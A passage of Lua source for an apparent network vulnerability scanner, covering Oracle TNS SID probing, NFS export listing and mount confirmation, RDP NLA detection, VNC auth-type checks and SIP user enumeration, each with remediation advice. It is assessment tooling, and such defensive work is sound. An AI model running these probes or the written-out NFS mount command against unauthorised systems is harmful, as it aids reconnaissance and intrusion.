        string.format("Oracle TNS listener exposes %d service(s)/SID(s)", #services),
        "The TNS listener's STATUS response reveals registered database service "
        .. "names and SIDs. Attackers use service names to construct valid "
        .. "connection strings and attempt authentication against specific databases.",
        {
          services    = table.concat(svc_list, ", "),
          remediation = "Set STATUS_LISTENER=BLOCK in listener.ora to hide "
                        .. "service information from unauthenticated STATUS requests",
        },
        0.95, 0.40
      )
    end
  end

  -- ---- [A1] Default SID probe (agg >= 1) --------------------------------
  if agg < 1 then return end

  local found_sids = {}
  for _, sid in ipairs(ORACLE_DEFAULT_SIDS) do
    local sd3, _ = tcp_connect(host_ip, port_num, timeout)
    if sd3 then
      -- Build a CONNECT to a specific SID
      local connect_data = string.format(
        "(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=%s)(PORT=%d))"
        .. "(CONNECT_DATA=(SID=%s)))",
        host_ip, port_num, sid
      )
      local data_section = "\x00\x00\x00\x00\x00\x00\x08\x00\x00\x40\xDE\xAD"
        .. "\x00\x00\x01\x00"
        .. u16_be(#connect_data)
        .. "\x00\x3C"
        .. "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
      local full_data  = data_section .. connect_data
      local total_len  = 8 + #full_data
      local sid_pkt    = u16_be(total_len) .. "\x00\x00\x01\x00\x00\x00" .. full_data

      sock_send(sd3, sid_pkt)
      local sid_resp = ""
      for _ = 1, 4 do
        local st, ch = sd3:receive()
        if not st then break end
        sid_resp = sid_resp .. ch
        if #sid_resp >= 256 then break end
      end
      sock_close(sd3)

      -- A REDIRECT or ACCEPT response means the SID exists
      -- Type byte at offset 5: 0x05 = REDIRECT, 0x02 = ACCEPT, 0x04 = REFUSE
      if #sid_resp >= 6 then
        local resp_type = sid_resp:byte(5)
        if resp_type == 0x05 or resp_type == 0x02 then
          table.insert(found_sids, sid)
          log_info(ctx, "oracle_tns", "Valid SID found: " .. sid)
        end
      end
    end
  end

  if #found_sids > 0 then
    ctx:add_finding(
      string.format("Oracle default SID(s) confirmed: %s", table.concat(found_sids, ", ")),
      "One or more default Oracle SIDs exist on this listener. "
      .. "Known SIDs dramatically simplify brute-force attacks — tools like "
      .. "odat, Metasploit oracle_login, or sqlplus can be pointed directly "
      .. "at these SIDs with default credential lists.",
      {
        valid_sids  = table.concat(found_sids, ", "),
        remediation = "Use non-default SID/service names; require client "
                      .. "certificates for TNS connections (TCPS)",
      },
      0.95, 0.55
    )
  end
end)


-- ===========================================================================
-- NFS MODULE  (port 2049/tcp)
-- ===========================================================================
-- Network File System exports filesystem paths to network clients.
-- Without proper access controls, any host can mount and access exports.
-- We use the mountd protocol (via portmapper or direct) to list exports.
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] Export listing: send MNT EXPORT RPC to the mountd service
--         and list all exported filesystem paths with their access controls
--    [P2] Access control analysis: flag exports accessible to everyone
--         ("everyone", "0.0.0.0/0", "*") — meaning no host restriction
--    [P3] Root squashing status: check if no_root_squash is set on exports
--         (exported as text in the export list response)
--
--  AGG 1 – safe-active:
--    [A1] Mount attempt: try to mount a detected export to confirm it is
--         accessible — we send the MOUNT RPC but do NOT perform any
--         file operations
--
--  Scoring:
--    World-accessible export         → confidence 0.99, impact 0.80 → CRITICAL
--    no_root_squash on export        → confidence 0.95, impact 0.85 → CRITICAL
--    Export listing succeeds         → confidence 0.95, impact 0.45 → MEDIUM
-- ===========================================================================

-- NFS/Mount RPC constants
local PROG_MOUNTD   = 100005
local VERS_MOUNTD   = 3
local PROC_EXPORT   = 5   -- MOUNTPROC3_EXPORT
local PROC_MNT      = 1   -- MOUNTPROC3_MNT

--- Build a Sun RPC EXPORT call for the mountd service.
-- Similar to the portmapper call in Day 6 but targeting mountd directly on 2049.
local function nfs_build_export_rpc(xid)
  xid = xid or math.random(1, 65535)

  local function u32(n)
    return string.char(
      math.floor(n/16777216)%256,
      math.floor(n/65536)%256,
      math.floor(n/256)%256,
      n%256
    )
  end

  -- RPC CALL header: xid + CALL + rpcvers + prog + vers + proc + auth_null×2
  local rpc_call = u32(xid) .. u32(0) .. u32(2)
    .. u32(PROG_MOUNTD) .. u32(VERS_MOUNTD) .. u32(PROC_EXPORT)
    .. u32(0) .. u32(0)   -- AUTH_NULL credentials
    .. u32(0) .. u32(0)   -- AUTH_NULL verifier
    -- No parameters for EXPORT

  -- TCP RPC record mark (last fragment bit set)
  local len = #rpc_call
  local record_mark = string.char(
    0x80 + math.floor(len/16777216)%128,
    math.floor(len/65536)%256,
    math.floor(len/256)%256,
    len%256
  )
  return record_mark .. rpc_call
end

--- Parse NFS EXPORT response.
-- Returns list of { path, clients } tables.
-- The export list is a linked list of (path, groups) pairs in XDR encoding.
local function nfs_parse_exports(data)
  if not data or #data < 32 then return {} end

  -- Skip 4-byte record mark + 24-byte RPC reply header
  local pos     = 5 + 24   -- approximate — skip to XDR data
  local exports = {}
  local safety  = 0

  -- XDR linked list: value-follows(4) + path_len(4) + path + padding + groups...
  while pos < #data - 4 and safety < 32 do
    safety = safety + 1

    -- value-follows
    local follows = read_u32_be(data, pos); pos = pos + 4
    if follows == 0 then break end

    -- path: XDR string = length(4 BE) + bytes + padding to 4-byte boundary
    if pos + 3 > #data then break end
    local path_len = read_u32_be(data, pos); pos = pos + 4
    if path_len > 256 or pos + path_len > #data then break end

    local path    = data:sub(pos, pos + path_len - 1)
    local padding = (4 - path_len % 4) % 4
    pos = pos + path_len + padding

    -- Groups: another XDR linked list of host/network strings
    local clients = {}
    local group_safety = 0
    while pos < #data - 4 and group_safety < 32 do
      group_safety = group_safety + 1
      local gfollows = read_u32_be(data, pos); pos = pos + 4
      if gfollows == 0 then break end

      if pos + 3 > #data then break end
      local grp_len = read_u32_be(data, pos); pos = pos + 4
      if grp_len > 128 or pos + grp_len > #data then break end

      local grp     = data:sub(pos, pos + grp_len - 1)
      local gpadding= (4 - grp_len % 4) % 4
      pos = pos + grp_len + gpadding
      table.insert(clients, trim(grp))
    end

    if path_len > 0 then
      table.insert(exports, { path = trim(path), clients = clients })
      log_info(nil, "nfs", string.format("Export: %s  clients: %s",
        path, table.concat(clients, ",")))
    end
  end

  return exports
end

-- Main NFS module
register_module("nfs", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number   -- 2049
  local timeout = ctx.config.timeout
  local agg     = ctx.config.aggression

  -- When hitting port 2049 directly, NFS EXPORT calls must go to mountd
  -- which is on a dynamic port. Query portmapper (111) to find mountd port.
  local mountd_port = port_num   -- fallback: try 2049 directly
  local pmapper_sd, _ = tcp_connect(host_ip, 111, timeout)
  if pmapper_sd then
    -- Send portmapper GETPORT for mountd (prog=100005, vers=3, proto=TCP=6)
    local function u32p(n)
      return string.char(math.floor(n/16777216)%256,math.floor(n/65536)%256,
                         math.floor(n/256)%256,n%256)
    end
    local xid = math.random(1,65535)
    local getport = u32p(xid)..u32p(0)..u32p(2)..u32p(100000)..u32p(2)..u32p(3)
      ..u32p(0)..u32p(0)..u32p(0)..u32p(0)  -- auth_null x2
      ..u32p(100005)..u32p(3)..u32p(6)..u32p(0)  -- prog,vers,proto,port
    local len = #getport
    local rm = string.char(0x80+math.floor(len/16777216)%128,
      math.floor(len/65536)%256,math.floor(len/256)%256,len%256)
    sock_send(pmapper_sd, rm .. getport)
    local presp = ""
    for _ = 1,8 do
      local st,ch = pmapper_sd:receive()
      if not st then break end
      presp = presp..ch
      if #presp >= 32 then break end
    end
    sock_close(pmapper_sd)
    -- Port is last 4 bytes of the XDR reply (after 28-byte RPC header)
    if #presp >= 32 then
      local found_port = read_u32_be(presp, 29)
      if found_port > 0 and found_port < 65536 then
        mountd_port = found_port
        log_info(ctx, "nfs", "mountd found on port " .. mountd_port .. " via portmapper")
      end
    end
  end

  -- ---- [P1] Export listing ----------------------------------------------
  local sd, err = tcp_connect(host_ip, mountd_port, timeout)
  if not sd then
    log_error(ctx, "nfs", "Cannot connect: " .. err)
    return
  end

  sock_send(sd, nfs_build_export_rpc())

  local resp = ""
  for _ = 1, 16 do
    local st, chunk = sd:receive()
    if not st then break end
    resp = resp .. chunk
    if #resp >= 4096 then break end
  end
  sock_close(sd)

  if #resp < 28 then
    log_info(ctx, "nfs", "No RPC export response (mountd may be on different port)")
    return
  end

  local exports = nfs_parse_exports(resp)

  if #exports == 0 then
    log_info(ctx, "nfs", "Export list empty or parse failed")
    return
  end

  -- Build export summary
  local export_lines     = {}
  local world_accessible = {}
  local no_squash        = {}

  for _, exp in ipairs(exports) do
    local clients_str = #exp.clients > 0 and table.concat(exp.clients, ",") or "(everyone)"
    table.insert(export_lines, exp.path .. "  →  " .. clients_str)

    -- Check for world-accessible exports
    for _, c in ipairs(exp.clients) do
      if c == "*" or c == "everyone" or c:match("^0%.0%.0%.0") then
        table.insert(world_accessible, exp.path)
        break
      end
    end
    if #exp.clients == 0 then
      table.insert(world_accessible, exp.path)
    end
  end

  ctx:add_finding(
    string.format("NFS export list disclosed: %d export(s)", #exports),
    "The NFS mountd service responded with a list of all exported filesystem "
    .. "paths and their client access controls. This information reveals "
    .. "shared paths, access restrictions (or lack thereof), and potential "
    .. "targets for unauthorized mounting.",
    {
      export_count  = tostring(#exports),
      exports       = table.concat(export_lines, " | "),
      remediation   = "Review /etc/exports; remove unused exports; "
                      .. "restrict to specific client IP ranges",
    },
    0.95, 0.45
  )

  -- World-accessible exports = CRITICAL
  if #world_accessible > 0 then
    ctx:add_finding(
      string.format("NFS exports accessible to ALL hosts: %d path(s) (CRITICAL)",
        #world_accessible),
      "The following NFS exports have no client restriction (accessible to "
      .. "* or everyone, or have no client list). Any host on any network "
      .. "can mount these shares without authentication and read or write files.",
      {
        world_exports = table.concat(world_accessible, ", "),
        remediation   = "/etc/exports: replace '*' with specific client IPs or subnets; "
                        .. "add 'ro' for read-only where write access is not needed; "
                        .. "add 'root_squash' (should be default)",
      },
      0.99, 0.80
    )
    log_warn(ctx, "nfs", "World-accessible exports: " .. table.concat(world_accessible, ", "))
  end

  -- AGG 1: attempt to mount first export to confirm access
  if agg >= 1 and #exports > 0 then
    local target_export = exports[1].path
    local mount_sd, _ = tcp_connect(host_ip, port_num, timeout)
    if mount_sd then
      -- Build MNT RPC call
      local function u32(n)
        return string.char(
          math.floor(n/16777216)%256, math.floor(n/65536)%256,
          math.floor(n/256)%256, n%256)
      end
      local path_xdr  = u32(#target_export) .. target_export
      local pad       = (4 - #target_export % 4) % 4
      path_xdr        = path_xdr .. string.rep("\x00", pad)

      local xid       = math.random(1, 65535)
      local rpc_call  = u32(xid) .. u32(0) .. u32(2)
        .. u32(PROG_MOUNTD) .. u32(VERS_MOUNTD) .. u32(PROC_MNT)
        .. u32(0) .. u32(0) .. u32(0) .. u32(0)
        .. path_xdr
      local len = #rpc_call
      local rm  = string.char(
        0x80+math.floor(len/16777216)%128,
        math.floor(len/65536)%256,
        math.floor(len/256)%256, len%256)

      sock_send(mount_sd, rm .. rpc_call)

      local mnt_resp = ""
      for _ = 1, 8 do
        local st, ch = mount_sd:receive()
        if not st then break end
        mnt_resp = mnt_resp .. ch
        if #mnt_resp >= 256 then break end
      end
      sock_close(mount_sd)

      -- Check for success: MNT reply with status=0 and file handle
      if #mnt_resp >= 32 then
        local reply_status = read_u32_be(mnt_resp, 29)  -- offset after RPC header
        if reply_status == 0 then
          ctx:add_finding(
            string.format("NFS mount of '%s' succeeded without authentication (CRITICAL)",
              target_export),
            string.format(
              "The RPC MOUNT call for '%s' returned status 0 (success) with a "
              .. "file handle. This confirms the export is mountable without "
              .. "credentials. An attacker can: mount -t nfs %s:%s /mnt/target "
              .. "and read/write files directly.",
              target_export, host_ip, target_export
            ),
            {
              export_path = target_export,
              mount_cmd   = string.format("mount -t nfs %s:%s /mnt/reko", host_ip, target_export),
              remediation = "Restrict export access in /etc/exports; "
                            .. "use NFSv4 with Kerberos authentication (sec=krb5)",
            },
            0.99, 0.85
          )
        end
      end
    end
  end
end)


end  

do  -- scope block: keeps locals under Lua 5.1's 200-variable limit

-- ===========================================================================
-- RDP MODULE  (port 3389/tcp)
-- ===========================================================================
-- Remote Desktop Protocol uses a multi-layer stack. The initial negotiation
-- (X.224 Connection Request / CC) happens before any credentials and reveals
-- the server's security capabilities.
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] X.224 Connection Request → parse Connection Confirm to detect:
--         - NLA (Network Level Authentication / CredSSP) required or optional
--         - Classic RDP security (no NLA) — credentials sent with weak RC4
--         - SSL/TLS negotiation capability
--    [P2] CredSSP / NLA fingerprint: if server offers NLA, record this as
--         a positive security note; if server falls back to classic RDP
--         security, flag as HIGH risk
--    [P3] Encryption level from MCS connect-initial (if accessible)
--
--  Scoring:
--    NLA not required (classic RDP)  → confidence 0.95, impact 0.70 → HIGH
--    Encryption level: LOW           → confidence 0.95, impact 0.65 → HIGH
--    RDP service confirmed active    → confidence 0.95, impact 0.30 → MEDIUM
-- ===========================================================================

-- RDP / X.224 constants
local RDP_NEG_REQ         = 0x01   -- RDP Negotiation Request type
local RDP_NEG_RESP        = 0x02   -- RDP Negotiation Response type
local RDP_NEG_FAILURE     = 0x03   -- RDP Negotiation Failure type

-- Requested protocols bitmap
local RDP_PROTOCOL_RDP    = 0x00   -- classic RDP (no NLA)
local RDP_PROTOCOL_SSL    = 0x01   -- TLS
local RDP_PROTOCOL_HYBRID = 0x02   -- CredSSP (NLA)
local RDP_PROTOCOL_RDSTLS = 0x04   -- RDSTLS

--- Build an RDP X.224 Connection Request (CR) TPDU.
-- We offer all protocols (SSL + CredSSP) so the server reveals what it supports.
local function rdp_build_x224_cr()
  -- RDP Negotiation Request: type(1) + flags(1) + length(2 LE) + protocols(4 LE)
  local rdp_neg_req =
    string.char(RDP_NEG_REQ) ..  -- type = RDP_NEG_REQ
    "\x00" ..                     -- flags = 0
    "\x08\x00" ..                 -- length = 8
    "\x03\x00\x00\x00"            -- requestedProtocols = SSL | CredSSP

  -- X.224 Connection Request TPDU
  -- TPDU code 0xE0 = CR, DST-REF = 0, SRC-REF = 0, CLASS = 0
  local x224_cr =
    string.char(#rdp_neg_req + 6) .. -- LI (length indicator = data after LI byte)
    "\xE0" ..                         -- TPDU code: Connection Request
    "\x00\x00" ..                     -- DST-REF
    "\x00\x00" ..                     -- SRC-REF
    "\x00" ..                         -- CLASS OPTIONS
    rdp_neg_req

  -- TPKT header: version(1) + reserved(1) + length(2 BE)
  local total_len = 4 + #x224_cr
  local tpkt = "\x03\x00" .. string.char(math.floor(total_len/256), total_len%256)

  return tpkt .. x224_cr
end

--- Parse the RDP X.224 Connection Confirm (CC) response.
-- Returns table: { selected_protocol, protocol_name, has_nla, has_ssl }
local function rdp_parse_x224_cc(data)
  if not data or #data < 11 then return nil end

  -- TPKT header is 4 bytes; X.224 CC starts at byte 5
  -- X.224 CC: LI(1) + 0xD0(code) + DST-REF(2) + SRC-REF(2) + CLASS(1) = 7 bytes
  local pos = 12   -- skip TPKT(4) + X.224 header(7) + 1 for RDP neg type

  if pos > #data then
    -- Shorter response — try to extract from what we have
    pos = 9
  end

  -- Look for RDP Negotiation Response or Failure
  local neg_type = data:byte(pos)
  if neg_type ~= RDP_NEG_RESP and neg_type ~= RDP_NEG_FAILURE then
    -- Scan for the neg type byte
    for i = 5, math.min(#data - 4, 20) do
      local b = data:byte(i)
      if b == RDP_NEG_RESP or b == RDP_NEG_FAILURE then
        neg_type = b
        pos = i + 1
        break
      end
    end
  else
    pos = pos + 1
  end

  if neg_type == RDP_NEG_FAILURE then
    return { selected_protocol = -1, protocol_name = "negotiation_failed",
             has_nla = false, has_ssl = false }
  end

  if neg_type ~= RDP_NEG_RESP then
    return { selected_protocol = 0, protocol_name = "classic_rdp",
             has_nla = false, has_ssl = false }
  end

  -- flags(1) + length(2) + selectedProtocol(4 LE)
  if pos + 5 > #data then
    return { selected_protocol = 0, protocol_name = "classic_rdp",
             has_nla = false, has_ssl = false }
  end

  local selected = data:byte(pos+2)
    + data:byte(pos+3) * 256
    + data:byte(pos+4) * 65536
    + data:byte(pos+5) * 16777216

  local proto_names = {
    [0] = "classic_rdp",
    [1] = "ssl_tls",
    [2] = "credSSP_NLA",
    [3] = "ssl_tls+credSSP",
    [4] = "rdstls",
  }

  return {
    selected_protocol = selected,
    protocol_name     = proto_names[selected] or ("protocol_" .. selected),
    has_nla           = (selected == 2 or selected == 3),
    has_ssl           = (selected >= 1),
  }
end

-- Main RDP module
register_module("rdp", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number
  local timeout = ctx.config.timeout

  local sd, err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "rdp", "Cannot connect: " .. err)
    return
  end

  sock_send(sd, rdp_build_x224_cr())

  local resp = ""
  for _ = 1, 4 do
    local st, chunk = sd:receive()
    if not st then break end
    resp = resp .. chunk
    if #resp >= 64 then break end
  end
  sock_close(sd)

  if #resp < 8 then
    log_warn(ctx, "rdp", "No X.224 CC response")
    return
  end

  local info = rdp_parse_x224_cc(resp)
  if not info then
    log_warn(ctx, "rdp", "Could not parse X.224 CC")
    return
  end

  log_info(ctx, "rdp", "Selected protocol: " .. info.protocol_name)

  -- Service confirmed
  ctx:add_finding(
    "RDP service active — selected protocol: " .. info.protocol_name,
    "Remote Desktop Protocol is accessible on this port. "
    .. "RDP is a primary lateral movement and initial access vector. "
    .. "Selected security protocol: " .. info.protocol_name .. ".",
    {
      selected_protocol = info.protocol_name,
      has_nla           = tostring(info.has_nla),
      has_ssl           = tostring(info.has_ssl),
    },
    0.95, 0.30
  )

  -- NLA not required = HIGH risk
  if not info.has_nla then
    ctx:add_finding(
      "RDP does not require Network Level Authentication (NLA) — HIGH risk",
      "The server did not select CredSSP/NLA as the security protocol. "
      .. "Without NLA, the full RDP login screen is presented before any "
      .. "authentication, enabling username enumeration, denial-of-service "
      .. "via session exhaustion, and exposure to pre-auth vulnerabilities "
      .. "like BlueKeep (CVE-2019-0708) and DejaBlue (CVE-2019-1181/1182).",
      {
        selected_protocol = info.protocol_name,
        remediation       = "GPO: Computer Configuration → Administrative Templates "
                            .. "→ Windows Components → Remote Desktop Services → "
                            .. "Require NLA → Enabled. "
                            .. "Registry: UserAuthentication=1 under "
                            .. "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
      },
      0.95, 0.70
    )
  else
    ctx:add_finding(
      "RDP Network Level Authentication (NLA) is enforced",
      "The server requires CredSSP/NLA before presenting the login screen. "
      .. "This mitigates pre-auth vulnerabilities and session exhaustion attacks.",
      { protocol = info.protocol_name },
      0.90, 0.05
    )
  end

  if not info.has_ssl and not info.has_nla then
    ctx:add_finding(
      "RDP using classic security — credentials protected only by weak RC4",
      "The server selected classic RDP security (no TLS, no NLA). "
      .. "Classic RDP uses RC4 encryption which is cryptographically broken. "
      .. "A network observer can potentially decrypt captured RDP sessions.",
      {
        remediation = "Enable TLS/NLA as above; ensure RDP uses at least "
                      .. "SecurityLayer=2 (TLS) in Group Policy",
      },
      0.95, 0.65
    )
  end
end)


-- ===========================================================================
-- VNC MODULE  (port 5900/tcp)
-- ===========================================================================
-- VNC sends a server greeting immediately, revealing the protocol version
-- and the authentication types the server will accept. No-authentication
-- (security type 1) means anyone can take over the desktop.
--
-- Checks performed:
--
--  AGG 0 – passive (VNC handshake is inherently interactive):
--    [P1] Protocol version: parse RFB version string
--    [P2] Security types: enumerate all offered types — flag type 1 (None)
--         as CRITICAL, type 2 (VNC auth) as MEDIUM, type 16/18 (TLS) as good
--    [P3] No-authentication confirmation: if type 1 is offered, complete
--         the handshake to confirm the server grants access without password
--
--  Scoring:
--    No authentication offered       → confidence 0.99, impact 0.95 → CRITICAL
--    VNC auth (type 2, brute-forceable) → confidence 0.95, impact 0.55 → HIGH
--    Protocol version < 3.7          → confidence 0.95, impact 0.50 → HIGH
-- ===========================================================================

local VNC_SEC_NONE      = 1    -- No authentication
local VNC_SEC_VNC_AUTH  = 2    -- VNC password auth (DES-based, weak)
local VNC_SEC_RA2       = 5    -- RA2
local VNC_SEC_TLS       = 18   -- VeNCrypt TLS
local VNC_SEC_SASL      = 20   -- SASL

local VNC_SEC_NAMES = {
  [1]  = "None (no password)",
  [2]  = "VNC Authentication (DES-based)",
  [5]  = "RA2",
  [6]  = "RA2ne",
  [16] = "Tight",
  [17] = "Ultra",
  [18] = "TLS",
  [19] = "VeNCrypt",
  [20] = "SASL",
  [21] = "MD5",
  [22] = "Colin Dean xvp",
}

register_module("vnc", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number
  local timeout = ctx.config.timeout

  local sd, err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "vnc", "Cannot connect: " .. err)
    return
  end

  -- VNC server sends RFB version string immediately: "RFB XXX.YYY\n"
  local banner_line, berr = sock_readline(sd)
  if not banner_line then
    log_warn(ctx, "vnc", "No banner: " .. (berr or ""))
    sock_close(sd); return
  end
  banner_line = trim(banner_line)

  -- Parse version: "RFB 003.008"
  local major, minor = banner_line:match("RFB (%d+)%.(%d+)")
  major = tonumber(major) or 0
  minor = tonumber(minor) or 0
  log_info(ctx, "vnc", "RFB version: " .. banner_line)

  -- We respond with the same version to proceed with negotiation
  sock_send(sd, banner_line .. "\n")

  -- Read security types (RFB 3.7+: length byte + type bytes)
  local security_types = {}
  local has_no_auth = false

  -- RFB 3.3: server sends 4-byte uint32 security type directly (no count byte)
  -- RFB 3.7+: server sends 1-byte count then N type bytes
  if major == 3 and minor <= 3 then
    -- RFB 3.3 protocol: read 4-byte security type
    local sec_bytes = read_bytes(sd, 4)
    if sec_bytes then
      -- uint32 big-endian: type is in byte 4
      local sec_type = sec_bytes:byte(4)
      table.insert(security_types, sec_type)
      if sec_type == VNC_SEC_NONE then has_no_auth = true end
      log_info(ctx, "vnc", "RFB 3.3 security type: " .. sec_type)
    end
  else
    -- RFB 3.7+ protocol: 1-byte count + type bytes
    local sec_data, _ = read_bytes(sd, 1)
    if sec_data then
      local num_types = sec_data:byte(1)
      if num_types == 0 then
        log_warn(ctx, "vnc", "Server rejected connection (0 security types)")
      elseif num_types > 0 and num_types <= 32 then
        local types_data = read_bytes(sd, num_types)
        if types_data then
          for i = 1, #types_data do
            local t = types_data:byte(i)
            table.insert(security_types, t)
            if t == VNC_SEC_NONE then has_no_auth = true end
          end
        end
      end
    end
  end

  sock_close(sd)

  -- Build type list for evidence
  local type_names = {}
  for _, t in ipairs(security_types) do
    table.insert(type_names, VNC_SEC_NAMES[t] or ("type_" .. t))
  end

  -- Version finding
  ctx:add_finding(
    string.format("VNC service active — RFB %d.%d — auth types: %s",
      major, minor, #type_names > 0 and table.concat(type_names, ", ") or "unknown"),
    "VNC Remote Frame Buffer protocol is active. The server greeting reveals "
    .. "the protocol version and all supported authentication types without "
    .. "requiring credentials.",
    {
      rfb_version    = string.format("%d.%d", major, minor),
      security_types = table.concat(type_names, ", "),
    },
    0.95, 0.30
  )

  -- CRITICAL: no authentication
  if has_no_auth then
    ctx:add_finding(
      "VNC security type 'None' offered — NO PASSWORD REQUIRED (CRITICAL)",
      "The VNC server advertises security type 1 (None), meaning any client "
      .. "can connect and take full graphical control of the desktop without "
      .. "providing any password. This is a complete authentication bypass "
      .. "granting interactive desktop access.",
      {
        security_type = "1 (None)",
        remediation   = "Set a VNC password immediately; use VeNCrypt (TLS) for "
                        .. "encrypted sessions; firewall port 5900 from untrusted networks; "
                        .. "consider replacing VNC with SSH tunnelled access",
      },
      0.99, 0.95
    )
    log_warn(ctx, "vnc", "NO AUTHENTICATION — VNC type None offered!")
  end

  -- HIGH: VNC auth (type 2) — weak DES-based challenge-response
  for _, t in ipairs(security_types) do
    if t == VNC_SEC_VNC_AUTH then
      ctx:add_finding(
        "VNC uses DES-based password authentication (weak)",
        "Security type 2 (VNC Authentication) uses a DES challenge-response "
        .. "scheme with an 8-character password limit. This is brute-forceable "
        .. "with tools like Crowbar or Medusa and is vulnerable to known "
        .. "DES weaknesses.",
        {
          security_type = "2 (VNC Authentication)",
          remediation   = "Upgrade to VeNCrypt (type 18/19) with TLS; "
                          .. "enforce a strong password > 8 chars (VNC truncates to 8)",
        },
        0.95, 0.55
      )
      break
    end
  end

  -- Older protocol version
  if major == 3 and minor < 7 then
    ctx:add_finding(
      string.format("VNC uses old protocol version RFB 3.%d", minor),
      "Protocol versions below 3.7 have known vulnerabilities and "
      .. "limited security type negotiation. Upgrade the VNC server.",
      { rfb_version = string.format("3.%d", minor), remediation = "Upgrade VNC server software" },
      0.95, 0.50
    )
  end
end)


-- ===========================================================================
-- SIP MODULE  (port 5060/udp)
-- ===========================================================================
-- SIP (Session Initiation Protocol) powers VoIP infrastructure.
-- An OPTIONS request reveals server software, supported methods, and
-- allows user enumeration via REGISTER probes.
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] OPTIONS probe: send SIP OPTIONS and parse the 200 OK response
--         for Server header, supported methods, and allowed content types
--    [P2] User agent fingerprinting from Server/User-Agent headers
--
--  AGG 1 – safe-active:
--    [A1] User enumeration: send REGISTER for common SIP usernames —
--         404 = user not found, 401/407 = user exists (auth required)
--
--  Scoring:
--    User enumeration possible       → confidence 0.90, impact 0.50 → HIGH
--    Server software disclosed       → confidence 0.95, impact 0.30 → MEDIUM
-- ===========================================================================

local SIP_TEST_USERS = {
  "admin", "administrator", "test", "guest", "100", "200", "1000",
  "operator", "reception", "voicemail",
}

--- Build a minimal SIP OPTIONS request.
local function sip_build_options(host_ip, port_num)
  local branch   = "z9hG4bK" .. string.format("%08x", math.random(0, 4294967295))
  local call_id  = string.format("%08x@%s", math.random(0, 4294967295), host_ip)
  local from_tag = string.format("%08x", math.random(0, 4294967295))

  return table.concat({
    "OPTIONS sip:" .. host_ip .. " SIP/2.0\r\n",
    "Via: SIP/2.0/UDP " .. host_ip .. ":" .. port_num .. ";branch=" .. branch .. "\r\n",
    "Max-Forwards: 70\r\n",
    "To: <sip:" .. host_ip .. ">\r\n",
    "From: <sip:reko@" .. host_ip .. ">;tag=" .. from_tag .. "\r\n",
    "Call-ID: " .. call_id .. "\r\n",
    "CSeq: 1 OPTIONS\r\n",
    "Contact: <sip:reko@" .. host_ip .. ">\r\n",
    "Accept: application/sdp\r\n",
    "Content-Length: 0\r\n",
    "\r\n",
  })
end

--- Build a SIP REGISTER request for user enumeration.
local function sip_build_register(host_ip, port_num, username)
  local branch  = "z9hG4bK" .. string.format("%08x", math.random(0, 4294967295))
  local call_id = string.format("%08x@%s", math.random(0, 4294967295), host_ip)
  local tag     = string.format("%08x", math.random(0, 4294967295))

  return table.concat({
    "REGISTER sip:" .. host_ip .. " SIP/2.0\r\n",
    "Via: SIP/2.0/UDP " .. host_ip .. ":" .. port_num .. ";branch=" .. branch .. "\r\n",
    "Max-Forwards: 70\r\n",
    "To: <sip:" .. username .. "@" .. host_ip .. ">\r\n",
    "From: <sip:" .. username .. "@" .. host_ip .. ">;tag=" .. tag .. "\r\n",
    "Call-ID: " .. call_id .. "\r\n",
    "CSeq: 1 REGISTER\r\n",
    "Contact: <sip:" .. username .. "@" .. host_ip .. ">\r\n",
    "Expires: 0\r\n",
    "Content-Length: 0\r\n",
    "\r\n",
  })
end

register_module("sip", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number   -- 5060/udp
  local timeout = ctx.config.timeout
  local agg     = ctx.config.aggression

  -- ---- [P1] OPTIONS probe -----------------------------------------------
  local options_pkt = sip_build_options(host_ip, port_num)
  local udp_sd = nmap.new_socket("udp")
  udp_sd:set_timeout(timeout)

  local ok, _ = udp_sd:sendto(host_ip, port_num, options_pkt)
  if not ok then
    sock_close(udp_sd)
    log_warn(ctx, "sip", "OPTIONS send failed")
    return
  end

  local status, resp = udp_sd:receive()
  sock_close(udp_sd)

  if not status or not resp then
    log_info(ctx, "sip", "No response to OPTIONS")
    return
  end

  -- Parse SIP response headers
  local sip_status  = resp:match("^SIP/%S+%s+(%d+)")
  local server_hdr  = resp:match("[Ss]erver:%s*([^\r\n]+)")
  local allow_hdr   = resp:match("[Aa]llow:%s*([^\r\n]+)")
  local ua_hdr      = resp:match("[Uu]ser%-[Aa]gent:%s*([^\r\n]+)")

  log_info(ctx, "sip", string.format("OPTIONS response: %s  Server: %s",
    sip_status or "?", server_hdr or "?"))

  ctx:add_finding(
    "SIP service active — server: " .. (server_hdr or ua_hdr or "unknown"),
    "The SIP server responded to an OPTIONS request, confirming the service "
    .. "is active and revealing software identity and supported methods. "
    .. "SIP servers are targets for toll fraud, credential stuffing, and "
    .. "call interception attacks.",
    {
      sip_status  = sip_status  or "unknown",
      server      = server_hdr  or "not disclosed",
      user_agent  = ua_hdr      or "not disclosed",
      allow       = allow_hdr   or "not disclosed",
      remediation = "Firewall SIP to authorised IP ranges; enable SIP TLS (SIPS); "
                    .. "implement fail2ban for SIP brute-force protection",
    },
    0.95, 0.30
  )

  -- ---- [A1] User enumeration (agg >= 1) ---------------------------------
  if agg < 1 then return end

  local valid_users = {}
  for _, username in ipairs(SIP_TEST_USERS) do
    local reg_pkt  = sip_build_register(host_ip, port_num, username)
    local udp_sd2  = nmap.new_socket("udp")
    udp_sd2:set_timeout(math.min(timeout, 3000))

    local ok2, _ = udp_sd2:sendto(host_ip, port_num, reg_pkt)
    if ok2 then
      local st2, resp2 = udp_sd2:receive()
      if st2 and resp2 then
        local code = resp2:match("^SIP/%S+%s+(%d+)")
        -- 401/407 = auth required (user exists), 404 = not found, 200 = registered
        if code == "401" or code == "407" or code == "200" then
          table.insert(valid_users, username .. "(" .. code .. ")")
        end
      end
    end
    sock_close(udp_sd2)
  end

  if #valid_users > 0 then
    ctx:add_finding(
      string.format("SIP user enumeration: %d valid user(s) found", #valid_users),
